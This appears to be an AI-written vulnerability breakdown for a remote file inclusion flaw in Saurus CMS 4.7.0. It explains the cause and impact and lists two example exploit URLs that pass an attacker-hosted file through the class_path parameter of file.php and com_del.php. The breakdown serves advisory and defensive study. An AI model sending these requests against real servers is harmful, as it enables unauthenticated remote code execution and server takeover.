Based on the provided content, here's a breakdown of the vulnerability:

*   **Root Cause:** The vulnerability is due to a Remote File Inclusion (RFI) flaw in Saurus CMS version 4.7.0.
*   **Weaknesses/Vulnerabilities:** The application is vulnerable to RFI, allowing an attacker to include remote files into the application's execution context.
*   **Impact of Exploitation:** An attacker could potentially execute arbitrary code on the server by including a malicious file from a remote location. This can lead to complete compromise of the server, data theft, or other malicious activities.
*   **Attack Vectors:** The attack vector is through HTTP requests to specific PHP files (`file.php` and `com_del.php`) with a crafted `class_path` parameter. The attacker injects a URL to a malicious file into the `class_path` parameter.
*  **Required Attacker Capabilities/Position:** The attacker needs to be able to send HTTP requests to the target server. No prior authentication is needed to exploit the vulnerability. The attacker needs to control the location of a malicious file they want to include.

**Technical Details:**

The exploit examples provided demonstrate how to trigger the vulnerability:

*   `http://target/SaurusCMSupdate4.7.0/saurus_cms_upd4.7.0/file.php?class_path=[EV!L]`
*   `http://target/SaurusCMSupdate4.7.0/saurus_cms_upd4.7.0/com_del.php?class_path=[EV!L]`

In these URLs, `[EV!L]` represents the URL to the attacker-controlled malicious file. The application will then attempt to include and execute this remote file via `file.php` or `com_del.php`

This information provides more detail than the placeholder CVE description.
